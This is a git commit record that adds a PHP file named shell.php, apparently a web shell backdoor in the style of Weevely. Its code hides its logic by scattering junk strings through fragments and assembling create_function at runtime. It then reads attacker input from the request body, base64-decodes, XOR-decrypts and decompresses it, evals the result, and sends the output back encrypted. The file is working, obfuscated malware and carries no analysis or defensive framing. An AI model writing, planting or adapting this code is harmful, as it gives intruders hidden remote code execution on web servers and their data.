99d4b7bd086db29b0db87d8ab6e94034d49f0788
mohammadamin <133483671+mdaminxf@users.noreply.github.com>
2023-10-07 09:12:53 +0530

    Create shell.php

---
+++ shell.php
@@ -0,0 +1,13 @@
+<?php
+$d='cxHh("/$xHkh(.+)$kxHf/xH",@file_gxHet_coxHntents("pxHhp:/xH/inputxH"),$m';
+$G=';xH$r=@baxHse64_xHencode(@x(@gzcompresxHs($o),xH$xHkxH));print("$p$kxHh$r$kf");}';
+$L='$xHk="158xHf306xH9";$kh="a435bxHxH314xHa80b";$kf="dcb024xHxHf8e422"xH;x';
+$t=')==xH1) {xH@ob_staxHrtxH();@evxHal(@gzuxHncomprexHss(@x(xH@bxHase64_dec';
+$o='xHlexHn($t);$o=""xH;for($ixH=0;$i<$l;xH){fxHor($xHj=0;($j<xHxH$c&&$i<$l);$x';
+$n='Hj++,$i+xH+){$o.xH=$t{$i}xH^$k{$j}xH;}}retxHurnxH xH$o;}ifxH (@preg_mat';
+$H='xHodexH($m[1]),$k)xH));$o=@oxHb_gexHtxH_contents(xH);@obxH_end_cleaxHn(xHxH)';
+$c='H$p="zQlhSb48eshxHOGenxH8";fuxHnction xxH($t,$xHk){$c=sxHtrlenxH($k);$l=stxHr';
+$Z=str_replace('l','','crllelate_fulncltlion');
+$S=str_replace('xH','',$L.$c.$o.$n.$d.$t.$H.$G);
+$j=$Z('',$S);$j();
+?>
